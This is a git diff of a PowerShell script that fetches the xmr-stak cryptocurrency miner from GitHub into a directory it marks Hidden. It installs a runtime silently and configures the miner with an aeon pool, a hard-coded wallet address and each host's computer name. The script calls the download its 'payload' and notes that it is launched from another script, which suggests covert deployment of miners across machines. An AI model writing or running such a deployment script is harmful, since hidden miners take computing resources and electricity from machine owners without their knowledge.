@@ -23,7 +23,7 @@ function payload ($destination) {
   # Get xmr-stak from github.
 
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.4.7/xmr-stak-win64.zip -OutFile $destination
+  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.7.1/xmr-stak-win64-2.7.1.zip -OutFile $destination
 
 }
 
@@ -60,6 +60,7 @@ function stripExcess ($template) {
 function alterConfigTpl ($file) {
 
   # alter the downloaded config template and set configuration
+
   (Get-Content "$file") | ForEach-Object { $_ -replace '"verbose_level" : 3,','"verbose_level" : 4,' } | Set-Content "$file"
   (Get-Content "$file") | ForEach-Object { $_ -replace '"print_motd" : true,','"print_motd" : false,' } | Set-Content "$file"
   (Get-Content "$file") | ForEach-Object { $_ -replace '"h_print_time" : 60,','"h_print_time" : 300,' } | Set-Content "$file"
@@ -75,7 +76,7 @@ function alterPoolTpl ($file) {
 
   (Get-Content "$file") | ForEach-Object { $_ -replace '"currency" : "CURRENCY"','"currency" : "aeon7"' } | Set-Content "$file"
   (Get-Content "$file") | ForEach-Object { $_ -replace "POOLCONF",'{"pool_address" : "pool.aeonminingpool.com:3335", "wallet_address" : "Wmt1MRyhVkffvWShqLBbytMWfdkRhzago6wHn61cgnMEMDEm5HNMsdmBycerj5iJVFjkEDAFcaVDiUxUEea6EvTJ1fhpkFnQc", "rig_id" : "", "pool_password" : "COMPUTERNAME", "use_nicehash" : false, "use_tls" : false, "tls_fingerprint" : "", "pool_weight" : 1 },
-	' } | Set-Content "$file"
+' } | Set-Content "$file"
   (Get-Content "$file") | ForEach-Object { $_ -replace "COMPUTERNAME","$env:COMPUTERNAME" } | Set-Content "$file"
 
 }
@@ -87,30 +88,39 @@ function alterPoolTpl ($file) {
 # Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1
 
 if (!(Test-Path $opsDirectory))
+
 {
+
   mkdir $opsDirectory
   $f = Get-Item $opsDirectory -Force
   $f.Attributes = "Hidden"
+
 }
 
-# Check to see if the Visual C++ Redistruibutable is installed
+# Check to see if the Visual C++ Redistributable is installed
 
-$redistDestination = "${psscriptroot}\vc_redist.x64.exe"
-$uninstallValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object DisplayName -eq "Microsoft Visual C++ 2017 x64 Additional Runtime - 14.14.26429"
+$redistDestination = "$opsDirectory\vc_redist.x64.exe"
+$uninstallValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object { $_.DisplayName -like '*Microsoft Visual C++*' } | Where-Object DisplayVersion -gt 14.16.27023
+$installValue = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object { $_.DisplayName -like '*Microsoft Visual C++*' }
 
-if ($uninstallValue -eq $null) 
+if ($null -eq $uninstallValue) 
 
 {
 
+  write-host "`nAttempting to install Microsoft Visual C++ Redistibutable..."
 	redist $redistDestination
 	Invoke-Expression "& '$redistDestination' /install /passive /norestart"
+  write-host "Installed!`n"
 
 }
 
 else 
 
 {
-	write-host $uninstallValue.DisplayName " - installed..."
+
+  write-host "`n"  
+  write-host $installValue.DisplayName | Format-Table
+  write-host "Currently Installed.`n"
 
 }
 
@@ -118,13 +128,13 @@ else
 
 $payloadDestination = "$opsDirectory\payload.zip"
 
-if (!(Test-Path "$opsDirectory\xmr-stak-win64"))
+if (!(Test-Path "$opsDirectory\xmr-stak-win64-.2.7.1"))
 
 {
 
   payload $payloadDestination
   Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
-  Remove-Item $payloadDestination
+  Remove-Item $payloadDestination -Force
 
 }
 
